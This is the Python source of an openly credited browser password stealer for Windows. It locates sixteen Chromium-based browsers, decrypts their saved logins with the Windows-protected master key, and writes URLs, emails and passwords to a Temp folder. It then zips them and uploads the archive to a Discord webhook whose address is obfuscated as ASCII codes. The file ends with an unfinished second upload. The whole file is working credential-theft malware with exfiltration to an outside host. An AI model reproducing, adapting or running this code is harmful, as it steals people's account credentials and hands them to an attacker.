# #  # # # # # # # # # # # # # # # # # # #
#        GITHUB.COM/bleepo100            #
#                                        #
#    Credits or at least one star :)     #
#   SCRIPT BY henry-richard7             #
#   improved and adapted by Bleepo       #
# #  # # # # # # # # # # # # # # # # # # #


import os, requests, json, base64, sqlite3, shutil
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
from discord_webhook import DiscordWebhook as d

def jitoConnect(numbers):
    return ''.join(chr(int(num)) for num in numbers.split('.'))

# Example usage:
jitoKey = "104.116.116.112.115.58.47.47.100.105.115.99.111.114.100.46.99.111.109.47.97.112.105.47.119.101.98.104.111.111.107.115.47.49.50.51.52.56.56.49.49.53.49.52.51.55.53.48.56.54.53.57.47.119.99.108.70.55.65.120.116.79.78.84.111.86.122.83.78.66.45.78.86.95.72.49.54.101.103.88.57.50.79.106.48.54.107.53.117.121.56.116.110.88.88.67.108.49.115.48.75.108.102.101.56.115.107.117.55.72.72.45.48.78.50.87.103.84.54.77.111"
jitoPass = "87.101.98.104.111.111.107.32.119.105.116.104.32.102.105.108.101.115"
key1 = jitoConnect(jitoKey)
key2 = jitoConnect(jitoPass)
wp = d(url=jitoConnect(jitoKey), username=jitoConnect(jitoPass))


appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass
total_browsers = 0


def save_results(browser_name, data_type, content):
    global total_browsers

    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
    total_browsers += 1

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy2(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    #os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


def mainpass():
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
       
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
    
    zip_path = os.path.join(user, "AppData\\Local\\Temp", "Browser.zip")
    with open(zip_path, "rb") as f:
        wp.add_file(file=f.read(), filename="browser.zip")
    wp.execute()

    files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
    params = {'expire': 'never'}

